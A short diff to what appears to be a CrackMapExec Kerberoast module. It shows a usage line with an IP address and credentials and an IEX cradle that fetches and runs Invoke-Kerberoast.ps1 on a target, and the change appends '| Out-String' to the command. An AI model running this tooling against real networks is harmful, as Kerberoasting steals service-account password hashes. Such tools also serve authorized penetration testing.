@@ -34,7 +34,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Kerberoast"
+        command = "Invoke-Kerberoast | Out-String"
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
